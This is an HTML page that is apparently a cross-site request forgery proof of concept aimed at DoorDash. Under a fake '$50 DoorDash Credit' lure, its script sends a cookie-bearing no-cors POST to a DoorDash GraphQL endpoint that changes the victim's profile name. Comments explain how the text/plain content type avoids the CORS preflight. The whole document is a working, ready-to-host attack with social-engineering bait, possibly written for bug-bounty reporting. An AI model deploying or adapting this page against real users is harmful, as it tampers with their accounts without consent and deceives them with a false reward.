<!DOCTYPE html>
<html>
<head>
    <meta name="referrer" content="no-referrer">
</head>
<body>
    <h1>Redirecting to your $50 DoorDash Credit...</h1>
    <p>Please do not close this window while we verify your account.</p>

    <script>
        const targetUrl = "https://www.doordash.com/graphql/editConsumerProfileInformation?_method=GET";
        
        const payload = JSON.stringify({
            operationName: "editConsumerProfileInformation",
            variables: {
                firstName: "CSRF",
                lastName: "Vulnerable"
            },
            query: "mutation editConsumerProfileInformation($firstName: String, $lastName: String) { updateConsumerProfileInformation(firstName: $firstName, lastName: $lastName) { id firstName lastName } }"
        });

        // The 'no-cors' mode is the key. It prevents the browser from 
        // asking the server for permission, but still sends the victim's cookies.
        fetch(targetUrl, {
            method: "POST",
            mode: "no-cors", 
            headers: {
                "Content-Type": "text/plain" // Prevents CORS preflight
            },
            body: payload
        }).then(() => {
            console.log("Attack sent!");
            // Redirect to profile after 2 seconds to show the result
            setTimeout(() => {
                window.location.href = "https://www.doordash.com/consumer/profile/";
            }, 2000);
        }).catch(err => console.error(err));
    </script>
</body>
</html>